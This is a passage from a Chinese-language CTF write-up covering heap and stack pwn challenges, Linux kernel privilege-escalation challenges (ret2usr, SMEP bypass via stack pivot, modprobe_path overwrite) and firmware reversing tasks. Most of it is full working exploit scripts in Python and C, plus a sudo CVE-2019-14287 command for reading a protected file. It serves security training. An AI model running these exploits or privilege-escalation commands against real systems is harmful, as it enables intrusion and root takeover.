class="string">'id:'</span>,str(<span class="number">0x400E96</span>))</span><br><span class="line">sh.sendafter(<span class="string">'info:'</span>,<span class="string">"a"</span>*<span class="number">0x4c</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x602028</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x602048</span>)+p64(<span class="number">0x400E86</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x400D4B</span>)</span><br><span class="line">sh.sendafter(<span class="string">'name:'</span>,payload.ljust(<span class="number">0x89</span>,<span class="string">'a'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'check it :'</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">read_addr=u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base=read_addr<span class="number">-0xF7310</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">free_hook2=(libc_base+<span class="number">0x3C67A8</span>)&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">syscall_addr=libc_base+<span class="number">0x101580</span></span><br><span class="line">setcontext=libc_base+<span class="number">0x47B85</span></span><br><span class="line">read_addr=libc_base+<span class="number">0xF7310</span></span><br><span class="line">mprotect=libc_base+<span class="number">0x101830</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v7=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> v7:</span><br><span class="line">	sh.sendline(str(x))</span><br><span class="line">print(hex(rbp))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">0xc</span>+p64(<span class="number">0x602040</span>)+<span class="string">'a'</span>*<span class="number">0x74</span>)</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook2</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = free_hook2</span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rip = read_addr <span class="comment">#: syscall; ret;</span></span><br><span class="line">payload = str(frame)</span><br><span class="line"></span><br><span class="line">layout=p64(libc_base+<span class="number">0x21112</span>)+p64(free_hook2)+p64(libc_base+<span class="number">0x202f8</span>)+p64(<span class="number">0x2000</span>)+p64(libc_base+<span class="number">0x1b92</span>)+p64(<span class="number">7</span>)+p64(mprotect)+p64(libc_base+<span class="number">0x2a71</span>)</span><br><span class="line">pause()</span><br><span class="line">sh.sendlineafter(<span class="string">'id:'</span>,str((libc_base+<span class="number">0x24374</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">sh.send(p64(rbp<span class="number">-0x80</span><span class="number">-0x48</span>)+p64(<span class="number">0</span>)+p64(setcontext)+p64(<span class="number">0</span>)+payload[<span class="number">0x68</span>:<span class="number">0xb0</span>])</span><br><span class="line"></span><br><span class="line">sh.send(layout + shellcode)</span><br><span class="line">print(sh.recv())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="4-undlcv"><a href="#4-undlcv" class="headerlink" title="4.undlcv"></a>4.undlcv</h4><p>存在off by null漏洞，并且将堆块地址存储在bss段上，也没开PIE。因此想到使用unlink就可以实现任意地址写，但写的次数一共只有四次，任意地址写的机会只有2次。看到保护为NO RELRO，考虑更改dynamic段中symtab和strtab的地址来实现system的调用。</p>
<p>第一次任意写将strtab改为0x4034a0，symtab改为0x403450。第二次将got表中的atoi改为0x401030，这样调用atoi就会调用第二个参数为0的_dl_runtime _resolve函数，紧接着我们在0x403450处构造虚假的symtab，其中第一项的strtab偏移设置为我们写入的system字符串，随后在0x4034a0处构造虚假的strtab，其中包含了system字符串。</p>
<p>最后发送/bin/sh就可以拿到shell。但拿到shell后发现无权读取flag，考虑sudo相关漏洞，发现sudo的版本满足CVE-2019-14287的要求，于是输入sudo -u#-1 cat flag成功拿到flag。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">	sh.send(<span class="string">'1'</span>.ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	sh.send(str(index).ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	sh.send(<span class="string">'2'</span>.ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	sh.send(str(index).ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	sh.send(<span class="string">'3'</span>.ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	sh.send(str(index).ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./undlcv')</span></span><br><span class="line">sh=remote(<span class="string">'183.129.189.60'</span>,<span class="number">10013</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">sh.send(<span class="string">'4'</span>.ljust(<span class="number">10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(<span class="number">0x403480</span><span class="number">-0x18</span>)+p64(<span class="number">0x403480</span><span class="number">-0x10</span>)+<span class="string">"a"</span>*<span class="number">0xd0</span>+p64(<span class="number">0xf0</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x18</span>+p64(<span class="number">0x4032a0</span>)+p64(<span class="number">0x403440</span>))</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">5</span>)+p64(<span class="number">0x4034a0</span>)+p64(<span class="number">6</span>)+p64(<span class="number">0x403450</span>))</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x401030</span>)+p64(<span class="number">0x401030</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">1</span>)+p32(<span class="number">0x12</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">0</span>)+<span class="string">"system\x00"</span>)</span><br><span class="line">pause()</span><br><span class="line">sh.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="内核安全"><a href="#内核安全" class="headerlink" title="内核安全"></a>内核安全</h3><h4 id="1-ddkernel"><a href="#1-ddkernel" class="headerlink" title="1.ddkernel"></a>1.ddkernel</h4><p>题目没开smep也没有kaslr。查看ko文件，发现是一个栈溢出，长度检测只检测了最低的字节，保证长度最低字节小于8即可。查看/proc/kallsyms得到相关地址后就可以commit_creds(prepare_kernel_cred)接返回用户态的system(‘/bin/sh’)一把梭。</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_regs</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">root</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs,user_ss,user_rsp,user_eflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd,i;</span><br><span class="line">	<span class="keyword">char</span> rop[<span class="number">0x100</span>];</span><br><span class="line">	save_regs();</span><br><span class="line">	fd=<span class="built_in">open</span>(<span class="string">"/proc/doudou"</span>,O_RDWR);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">	rop[i]=<span class="string">'a'</span>;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">16</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)root;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">24</span>]=<span class="number">0xFFFFFFFF81536FFB</span>;<span class="comment">//swapgs;ret</span></span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">32</span>]=<span class="number">0xFFFFFFFF8100C33A</span>;<span class="comment">//iretq</span></span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">40</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">48</span>]=user_cs;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">56</span>]=user_eflags;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">64</span>]=user_rsp;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">72</span>]=user_ss;</span><br><span class="line">	<span class="built_in">write</span>(fd,rop,<span class="number">0x100</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_regs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">	<span class="string">"movq %%cs,%0;"</span></span><br><span class="line">	<span class="string">"movq %%ss,%1;"</span></span><br><span class="line">	<span class="string">"movq %%rsp,%2;"</span></span><br><span class="line">	<span class="string">"pushf;"</span></span><br><span class="line">	<span class="string">"popq %3;"</span></span><br><span class="line">	:<span class="string">"=r"</span>(user_cs),<span class="string">"=r"</span>(user_ss),<span class="string">"=r"</span>(user_rsp),<span class="string">"=r"</span>(user_eflags)::<span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* (*p_k_c)(<span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*c_c)(<span class="keyword">char</span>*);</span><br><span class="line">	p_k_c=<span class="number">0xffffffff8105d157</span>;<span class="comment">//prepare_kernel_cred</span></span><br><span class="line">	c_c=<span class="number">0xffffffff8105d235</span>;<span class="comment">//commit_creds</span></span><br><span class="line">	c_c(p_k_c(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-babycall"><a href="#2-babycall" class="headerlink" title="2.babycall"></a>2.babycall</h4><p>这道题开启了smep但是没开启kaslr。相关函数地址无法直接通过cat /proc/kallsyms查看，可以先将init文件中的gid改为0再查看。</p>
<p>漏洞点在于我们可以更改vuln处存储的地址，然后通过调用号为0x10001的ioctl调用来执行该处地址代码。我们将vuln处改为一个gadget的地址0xffffffff813a3618，选择这个gadget是因为它是8字节对齐的而且ret后面跟的参数也是8字节对齐的，满足栈地址的要求。它执行xchg eax,esp可以实现栈迁移，由于xchg会将不交换的那部分字节置0，所以rsp就会到用户空间中去，我们事先mmap对应位置0x813a3000处的内存空间出来，在其中可以布置好rop链。</p>
<p>由于vmlinux中没有提权所需的函数，所以采取更改modprobe_path的方式提权，利用ROP将modprobe_path处改为/sem.sh即可，这里使用了mov [rsi],rdx这种gadget。运行完exp程序，只要执行以下命令即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#39;#!&#x2F;bin&#x2F;sh\n&#x2F;bin&#x2F;chmod 777 &#x2F;flag&#39; &gt; &#x2F;sem.sh</span><br><span class="line">chmod +x &#x2F;sem.sh</span><br><span class="line">echo -ne &#39;\xff\xff\xff\xff&#39; &gt; &#x2F;sir</span><br><span class="line">chmod +x &#x2F;sir</span><br><span class="line">&#x2F;sir</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<p>sem.sh会把flag权限改为所有人可读，然后执行一个非法的elf文件就可以触发执行modprobe_path处存储的sem.sh，最终能够读取到flag。</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_regs</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">root</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs,user_ss,user_rsp,user_eflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd,i;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">30</span>],b[<span class="number">9</span>]=<span class="string">"deadbeef"</span>,*rop;<span class="comment">//mod_tree ffffffff82606a80   run_cmd ffffffff810bd625   xchg 0xffffffff813a3618</span></span><br><span class="line">	<span class="keyword">char</span> *pop_rdi=<span class="number">0xFFFFFFFF81026CAD</span>,*pop_rsi=<span class="number">0xFFFFFFFF8131422E</span>,*pop_rdx=<span class="number">0xFFFFFFFF81512EF6</span>,*mov_crsi_rdx=<span class="number">0xffffffff8103d348</span>,*modprobe=<span class="number">0xFFFFFFFF8265BE00</span>;</span><br><span class="line">	<span class="keyword">char</span> path[<span class="number">16</span>]=<span class="string">"/sem.sh\x00"</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">	b[i]=b[i]-<span class="string">'a'</span>+<span class="number">10</span>;</span><br><span class="line">	*(<span class="keyword">char</span>**)&amp;b[<span class="number">8</span>]=<span class="number">0xffffffff813a3618</span>;</span><br><span class="line">	save_regs();</span><br><span class="line">	fd=<span class="built_in">open</span>(<span class="string">"/dev/babycall"</span>,O_RDWR);</span><br><span class="line">	ioctl(fd,<span class="number">0x10001</span>,b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1\n"</span>);</span><br><span class="line">	</span><br><span class="line">	rop=mmap(<span class="number">0x813a3000</span>,<span class="number">0x4000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>,rop);</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">0</span>+<span class="number">0x618</span>]=pop_rdx;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">8</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=<span class="number">0x68732e6d65732f</span>;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">16</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=pop_rsi;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">24</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=modprobe;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">32</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=mov_crsi_rdx;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">40</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=<span class="number">0xFFFFFFFF810728C4</span>;<span class="comment">//swapgs;pop rbp</span></span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">48</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=<span class="number">0</span>;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">56</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=<span class="number">0xFFFFFFFF810374EB</span>;<span class="comment">//iretq</span></span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">64</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=(<span class="keyword">char</span>*)get_shell;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">72</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=user_cs;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">80</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=user_eflags;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">88</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=user_rsp;</span><br><span class="line">	*(<span class="keyword">char</span> **)&amp;rop[<span class="number">96</span>+<span class="number">0x618</span>+<span class="number">0x2040</span>]=user_ss;</span><br><span class="line">	ioctl(fd,<span class="number">0x10001</span>,rop);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_regs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">	<span class="string">"movq %%cs,%0;"</span></span><br><span class="line">	<span class="string">"movq %%ss,%1;"</span></span><br><span class="line">	<span class="string">"movq %%rsp,%2;"</span></span><br><span class="line">	<span class="string">"pushf;"</span></span><br><span class="line">	<span class="string">"popq %3;"</span></span><br><span class="line">	:<span class="string">"=r"</span>(user_cs),<span class="string">"=r"</span>(user_ss),<span class="string">"=r"</span>(user_rsp),<span class="string">"=r"</span>(user_eflags)::<span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* (*p_k_c)(<span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*c_c)(<span class="keyword">char</span>*);</span><br><span class="line">	p_k_c=<span class="number">0xffffffff810bd150</span>;<span class="comment">//prepare_kernel_cred</span></span><br><span class="line">	c_c=<span class="number">0xffffffff810bcd60</span>;<span class="comment">//commit_creds</span></span><br><span class="line">	c_c(p_k_c(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1\n"</span>);</span><br><span class="line">	<span class="comment">//echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' &gt; /sem.sh</span></span><br><span class="line">	<span class="comment">//chmod +x /sem.sh</span></span><br><span class="line">	<span class="comment">//echo -ne '\xff\xff\xff\xff' &gt; /sir</span></span><br><span class="line">	<span class="comment">//chmod +x /sir	</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="固件安全"><a href="#固件安全" class="headerlink" title="固件安全"></a>固件安全</h3><h4 id="1-nodemcu"><a href="#1-nodemcu" class="headerlink" title="1.nodemcu"></a>1.nodemcu</h4><p>直接记事本打开搜索flag字符串就可以得到flag。</p>
<h4 id="2-stm"><a href="#2-stm" class="headerlink" title="2.stm"></a>2.stm</h4><p>先使用BinToHex将文件转为intel HEX的格式，用ida打开，将Processor type设置成ARM Big-endian，然后在Processor options中edit architecture options选择ARMv7-M。</p>
<p>然后在里面一通瞎找，找到hello world字符串，找到调用其的位置就是主要逻辑。关键的加密位于0x314。它将0x344开始的42个字节与0x1E异或后加3，这就是flag了。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2021/08/16/j6mHsrz8wtnJYx7.png" alt="image-20210201172116449" title="">
                </div>
                <div class="image-caption">image-20210201172116449</div>
            </figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">b"\x7D\x77\x40\x7A\x66\x30\x2A\x2F\x28\x40\x7E\x30\x33\x34\x2C\x2E\x2B\x28\x34\x30\x30\x7C\x41\x34\x28\x33\x7E\x30\x34\x33\x33\x30\x7E\x2F\x31\x2A\x41\x7F\x2F\x28\x2E\x64"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">	flag=flag+chr((x^<span class="number">0x1e</span>)+<span class="number">3</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h4 id="3-easybios"><a href="#3-easybios" class="headerlink" title="3.easybios"></a>3.easybios</h4><p>ida打开查看所有字符串，看到有lzma的字样，说明被lzma压缩了。010editor打开查找5D 00 00 00，将之后的内容复制出来，并把末尾大量的0xFF删去，此时可以成功解压缩。</p>
<p>解压缩后用ida打开，查找运行bios输入flag错误时出现的字符串Wrong!，要按宽字符查找才能找到。成功定位到关键逻辑后，发现是一个rc4加密，密钥为OVMF_And_Easy_Bios。解密出字节串后变更为16进制字符串的形式就是flag了。</p>
